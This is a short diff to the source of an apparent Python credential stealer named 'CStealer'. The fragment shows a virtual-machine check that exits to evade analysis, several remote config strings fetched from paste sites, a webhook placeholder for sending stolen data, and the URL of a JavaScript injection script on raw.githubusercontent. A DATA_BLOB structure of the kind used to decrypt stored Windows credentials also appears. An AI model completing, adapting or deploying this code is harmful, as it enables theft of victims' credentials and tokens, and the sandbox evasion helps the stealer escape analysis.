@@ -100,24 +100,24 @@ def check_dll():
     if os.path.exists(os.path.join(sys_root, "System32\\vmGuestLib.dll")) or os.path.exists(os.path.join(sys_root, "vboxmrxnp.dll")):
         exit_program('VM Detected')
 
-cname = "https://rentry.co/u4tup/raw"
+cname = "https://pastebin.com/raw/Y8UMPykJ"
 cnameresp = requests.get(cname)
 cname = cnameresp.text
 
-smallcname = "https://rentry.co/u7hcdw7r/raw"
+smallcname = "https://pastebin.com/raw/Y8UMPykJ"
 smallcnameresp = requests.get(smallcname)
 smallcname = smallcnameresp.text
 
-footerc = "https://rentry.co/n9t3khws/raw"
+footerc = "https://pastebin.com/raw/Y8UMPykJ"
 footercresp = requests.get(footerc)
 footerc = footercresp.text
 
-words = "https://rentry.co/5uu99/raw"
+words = "https://pastebin.com/raw/Y8UMPykJ"
 wordsresp = requests.get(words)
 words = wordsresp.text
 
 h00k = "YOUR_WEBHOOK_URL"
-inj3c710n_url = f"https://raw.githubusercontent.com/wtf{cname}wtf/index/main/injection.js"
+inj3c710n_url = f"https://raw.githubusercontent.com/wtfCStealerwtf/index/main/injection.js"
 
 class DATA_BLOB(Structure):
     _fields_ = [
